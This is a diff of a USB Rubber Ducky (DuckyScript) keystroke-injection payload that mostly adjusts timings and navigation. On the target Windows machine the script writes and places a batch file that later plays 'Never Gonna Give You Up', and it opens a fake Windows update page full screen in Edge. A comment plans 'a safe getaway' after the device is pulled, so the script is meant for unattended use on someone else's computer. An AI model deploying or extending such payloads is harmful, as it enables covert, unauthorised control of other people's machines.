@@ -26,7 +26,7 @@ REPEAT 120
 DELAY 100
 ALT F4
 
-DELAY 3000
+DELAY 1500
 REM creates batch file
 GUI
 DELAY 100
@@ -45,7 +45,7 @@ DELAY 100
 ENTER
 REM batch delay for when Never Gonna Give You Up will start being played
 REM enough time for the ducky to be removed after the script is executed and allow for a safe getaway
-STRING TIMEOUT /T 600
+STRING TIMEOUT /T 10
 DELAY 500
 ENTER
 REM on default browser
@@ -56,7 +56,7 @@ STRING TIMEOUT /T 3
 ENTER
 DELAY 500
 REM Opens microsoft edge, opens fake windows update and sets it full screen
-STRING START CMD -command "$wshell = New-Object -ComObject wscript.shell;[system.Diagnostics.Process]::Start(\"msedge\",\"about:blank\");Sleep 1;$wshell.SendKeys('^"{l}"');Sleep 1;$wshell.SendKeys('https://fakeupdate.net/win10ue/');$wshell.SendKeys('"{Enter}"');$wshell.SendKeys('"{F11}"')"
+STRING -command "$wshell = New-Object -ComObject wscript.shell;[system.Diagnostics.Process]::Start(\"msedge\",\"about:blank\");Sleep 1;$wshell.SendKeys('^"{l}"');Sleep 1;$wshell.SendKeys('https://fakeupdate.net/win10ue/');$wshell.SendKeys('"{Enter}"');$wshell.SendKeys('"{F11}"')"
 ENTER
 STRING exit
 DELAY 1000
@@ -73,12 +73,32 @@ DELAY 100
 DOWNARROW
 REPEAT 1
 ENTER
-DELAY 100
+REM
+REM unfortunately "TAB REPEAT 9" causes the script to get stuck to file explorer's search bar
+REM splitting the repeat and adding delays between them did not solve it
+REM
 TAB
-REPEAT 2
-DELAY 1000
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+REM selects documents folder
+DELAY 200
+STRING doc
 ENTER
-DELAY 500
+DELAY 1000
 ALT F4
 
 
@@ -90,7 +110,5 @@ SPACE
 STRING sr.b
 DELAY 500
 STRING at
-DELAY 3000
-RIGHTARROW
 DELAY 1000
 ENTER
